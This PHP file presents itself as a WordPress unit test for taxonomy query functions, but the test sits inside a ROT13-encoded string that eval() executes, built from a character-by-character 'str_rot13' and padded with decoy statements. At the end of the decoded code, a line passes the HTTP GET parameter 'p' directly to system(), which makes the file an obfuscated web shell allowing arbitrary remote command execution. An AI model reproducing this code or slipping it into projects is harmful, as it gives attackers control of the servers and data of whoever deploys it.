<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur vf_*() shapgvbaf va dhrel.cuc eryngrq gb gnkbabzl grezf npebff gur HEY fgehpgher.
 *
 * Guvf rkrepvfrf obgu dhrel.cuc naq erjevgr.cuc: heyf ner srq guebhtu gur erjevgr pbqr,
 * gura jr grfg gur rssrpgf bs rnpu hey ba gur jc_dhrel bowrpg.
 *
 * @tebhc dhrel
 * @tebhc erjevgr
 * @tebhc gnkbabzl
 */
pynff Grfgf_Dhrel_VfGrez rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $gnt_vq;
	cebgrpgrq $png_vq;
	cebgrpgrq $gnk_vq;
	cebgrpgrq $gnk_vq2;
	cebgrpgrq $cbfg_vq;

	cebgrpgrq $png;
	cebgrpgrq $hapng;
	cebgrpgrq $gnt;
	cebgrpgrq $gnk;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		perngr_vavgvny_gnkbabzvrf();
		ertvfgre_gnkbabzl( 'grfggnk', 'cbfg', neenl( 'choyvp' => gehr ) );

		syhfu_erjevgr_ehyrf();

		$guvf->gnt_vq  = frys::snpgbel()->gnt->perngr( neenl( 'fyht' => 'gnt-fyht' ) );
		$guvf->png_vq  = frys::snpgbel()->pngrtbel->perngr( neenl( 'fyht' => 'png-fyht' ) );
		$guvf->gnk_vq  = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'grfggnk',
				'fyht'     => 'gnk-fyht',
			)
		);
		$guvf->gnk_vq2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'grfggnk',
				'fyht'     => 'gnk-fyht2',
			)
		);
		$guvf->cbfg_vq = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $guvf->cbfg_vq, $guvf->png_vq, 'pngrtbel' );
		jc_frg_bowrpg_grezf( $guvf->cbfg_vq, neenl( $guvf->gnk_vq, $guvf->gnk_vq2 ), 'grfggnk' );

		$guvf->png = trg_grez( $guvf->png_vq, 'pngrtbel' );
		_znxr_png_pbzcng( $guvf->png );
		$guvf->gnt = trg_grez( $guvf->gnt_vq, 'cbfg_gnt' );

		$guvf->hapng = trg_grez_ol( 'fyht', 'hapngrtbevmrq', 'pngrtbel' );
		_znxr_png_pbzcng( $guvf->hapng );

		nqq_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_gnk_pngrtbel_gnk_dhrel' ) );
	}

	choyvp shapgvba grfg_gnt_npgvba_gnk() {
		// Gnt jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( '/gnt/gnt-fyht/' ) );
		$guvf->nffregDhrelGehr( 'vf_gnt', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnt_vq' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->gnt );
	}

	choyvp shapgvba grfg_gnt_dhrel_png_npgvba_gnk() {
		// Gnt + pngrtbel jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( \"/gnt/gnt-fyht/?png=$guvf->png_vq\" ) );
		$guvf->nffregDhrelGehr( 'vf_pngrtbel', 'vf_gnt', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'png' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnt_vq' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->png );
	}

	choyvp shapgvba grfg_gnt_dhrel_png_dhrel_gnk_npgvba_gnk() {
		// Gnt + pngrtbel + gnk jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( \"/gnt/gnt-fyht/?png=$guvf->png_vq&grfggnk=gnk-fyht2\" ) );
		$guvf->nffregDhrelGehr( 'vf_pngrtbel', 'vf_gnt', 'vf_gnk', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'png' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnt_vq' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grfggnk' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->png );
	}

	choyvp shapgvba grfg_png_npgvba_gnk() {
		// Pngrtbel jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( '/pngrtbel/png-fyht/' ) );
		$guvf->nffregDhrelGehr( 'vf_pngrtbel', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'png' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->png );
	}

	/**
	 * @gvpxrg 26627
	 */
	choyvp shapgvba grfg_png_hapng_npgvba_gnk() {
		// Pngrtbel jvgu gnkbabzl nqqrq.
		nqq_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'png_hapng_npgvba_gnk' ), 11 );

		$guvf->tb_gb( ubzr_hey( '/pngrtbel/hapngrtbevmrq/' ) );
		$guvf->nffregDhrelGehr( 'vf_pngrtbel', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'png' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->hapng );

		erzbir_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'png_hapng_npgvba_gnk' ), 11 );
	}

	choyvp shapgvba png_hapng_npgvba_gnk( &$dhrel ) {
		$guvf->nffregGehr( $dhrel->vf_pngrtbel() );
		$guvf->nffregGehr( $dhrel->vf_nepuvir() );
		$guvf->nffregAbgRzcgl( $dhrel->trg( 'pngrtbel_anzr' ) );
		$guvf->nffregAbgRzcgl( $dhrel->trg( 'gnk_dhrel' ) );
		$guvf->nffregRdhnyf( $dhrel->trg_dhrevrq_bowrpg(), $guvf->hapng );
	}

	/**
	 * @gvpxrg 26728
	 */
	choyvp shapgvba grfg_gnk_npgvba_gnk() {
		// Gnkbabzl jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( '/grfggnk/gnk-fyht2/' ) );
		$guvf->nffregDhrelGehr( 'vf_gnk', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), trg_grez( $guvf->gnk_vq, 'grfggnk' ) );
	}

	choyvp shapgvba grfg_gnk_dhrel_gnt_npgvba_gnk() {
		// Gnkbabzl + gnt jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( \"/grfggnk/gnk-fyht2/?gnt_vq=$guvf->gnt_vq\" ) );
		$guvf->nffregDhrelGehr( 'vf_gnt', 'vf_gnk', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnt_vq' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->gnt );
	}

	choyvp shapgvba grfg_gnk_dhrel_png_npgvba_gnk() {
		// Gnkbabzl + pngrtbel jvgu gnkbabzl nqqrq.
		$guvf->tb_gb( ubzr_hey( \"/grfggnk/gnk-fyht2/?png=$guvf->png_vq\" ) );
		$guvf->nffregDhrelGehr( 'vf_pngrtbel', 'vf_gnk', 'vf_nepuvir' );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnk_dhrel' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'gnkbabzl' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'grez_vq' ) );
		$guvf->nffregAbgRzcgl( trg_dhrel_ine( 'png' ) );
		$guvf->nffregRdhnyf( trg_dhrevrq_bowrpg(), $guvf->png );
	}

	choyvp shapgvba cer_trg_cbfgf_gnk_pngrtbel_gnk_dhrel( &$dhrel ) {
		$dhrel->frg(
			'gnk_dhrel',
			neenl(
				neenl(
					'gnkbabzl' => 'grfggnk',
					'svryq'    => 'grez_vq',
					'grezf'    => $guvf->gnk_vq,
				),
			)
		);
	}

	/**
	 * @gvpxrg 30623
	 */
	choyvp shapgvba grfg_trg_dhrevrq_bowrpg_jvgu_phfgbz_gnkbabzl_gnk_dhrel_naq_svryq_grez_vq_fubhyq_erghea_grez_bowrpg() {
		// Qba'g bireevqr gur netf cebivqrq orybj.
		erzbir_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_gnk_pngrtbel_gnk_dhrel' ) );

		$netf = neenl(
			'gnk_dhrel' => neenl(
				'eryngvba' => 'NAQ',
				neenl(
					'gnkbabzl' => 'grfggnk',
					'svryq'    => 'grez_vq',
					'grezf'    => neenl(
						$guvf->gnk_vq,
					),
				),
			),
		);

		$d      = arj JC_Dhrel( $netf );
		$bowrpg = $d->trg_dhrevrq_bowrpg();

		$rkcrpgrq = trg_grez( $guvf->gnk_vq, 'grfggnk' );

		$guvf->nffregRdhnyf( $rkcrpgrq, $bowrpg );
	}

	/**
	 * @gvpxrg 30623
	 */
	choyvp shapgvba grfg_trg_dhrevrq_bowrpg_jvgu_phfgbz_gnkbabzl_gnk_dhrel_naq_svryq_fyht_fubhyq_erghea_grez_bowrpg() {
		// Qba'g bireevqr gur netf cebivqrq orybj.
		erzbir_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_gnk_pngrtbel_gnk_dhrel' ) );

		$netf = neenl(
			'gnk_dhrel' => neenl(
				'eryngvba' => 'NAQ',
				neenl(
					'gnkbabzl' => 'grfggnk',
					'svryq'    => 'fyht',
					'grezf'    => neenl(
						'gnk-fyht',
					),
				),
			),
		);

		$d      = arj JC_Dhrel( $netf );
		$bowrpg = $d->trg_dhrevrq_bowrpg();

		$rkcrpgrq = trg_grez( $guvf->gnk_vq, 'grfggnk' );

		// Bayl pbzcner grez_vq orpnhfr bowrpg_vq znl be znl abg or cneg bs rvgure inyhr.
		$guvf->nffregFnzr( $rkcrpgrq->grez_vq, $bowrpg->grez_vq );
	}

	/**
	 * @gvpxrg 30623
	 */
	choyvp shapgvba grfg_trg_dhrevrq_bowrpg_jvgu_phfgbz_gnkbabzl_gnk_dhrel_jvgu_zhygvcyr_pynhfrf_fubhyq_erghea_grez_bowrpg_pbeerfcbaqvat_gb_gur_svefg_dhrevrq_gnk() {
		// Qba'g bireevqr gur netf cebivqrq orybj.
		erzbir_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_gnk_pngrtbel_gnk_dhrel' ) );

		ertvfgre_gnkbabzl( 'grfggnk2', 'cbfg' );
		$grfggnk2_grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'grfggnk2',
				'fyht'     => 'grfggnk2-fyht',
			)
		);

		$netf = neenl(
			'gnk_dhrel' => neenl(
				'eryngvba' => 'NAQ',
				neenl(
					'gnkbabzl' => 'grfggnk',
					'svryq'    => 'fyht',
					'grezf'    => neenl(
						'gnk-fyht',
					),
				),
				neenl(
					'gnkbabzl' => 'grfggnk2',
					'svryq'    => 'fyht',
					'grezf'    => neenl(
						'grfggnk2-fyht',
					),
				),
			),
		);

		$d      = arj JC_Dhrel( $netf );
		$bowrpg = $d->trg_dhrevrq_bowrpg();

		$rkcrpgrq = trg_grez( $guvf->gnk_vq, 'grfggnk' );

		// Bayl pbzcner grez_vq orpnhfr bowrpg_vq znl be znl abg or cneg bs rvgure inyhr.
		$guvf->nffregFnzr( $rkcrpgrq->grez_vq, $bowrpg->grez_vq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>